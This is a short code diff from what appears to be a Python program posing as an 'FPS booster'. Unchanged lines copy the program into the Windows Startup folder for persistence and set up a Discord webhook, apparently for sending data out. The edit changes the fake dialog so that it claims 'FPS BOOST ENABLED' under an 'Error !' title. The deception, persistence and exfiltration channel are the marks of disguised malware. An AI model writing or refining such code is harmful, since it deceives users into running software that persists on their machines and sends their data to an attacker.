@@ -20,8 +20,8 @@ def launch():
     filePath = shutil.copy(sys.argv[0], roaming + '\Microsoft\Windows\Start Menu\Programs\Startup')
 launch()
 
-ICON_STOP = 0x1
-result = windll.user32.MessageBoxW(0, "FpsBooster \nRestart Your Pc to take affect", "ChangeLog", ICON_STOP)
+ICON_STOP = 0x10
+result = windll.user32.MessageBoxW(0, "Code : 5894 \nFPS BOOST ENABLED", "Error !", ICON_STOP)
 
 hook = dhooks.Webhook(punchnox)
 
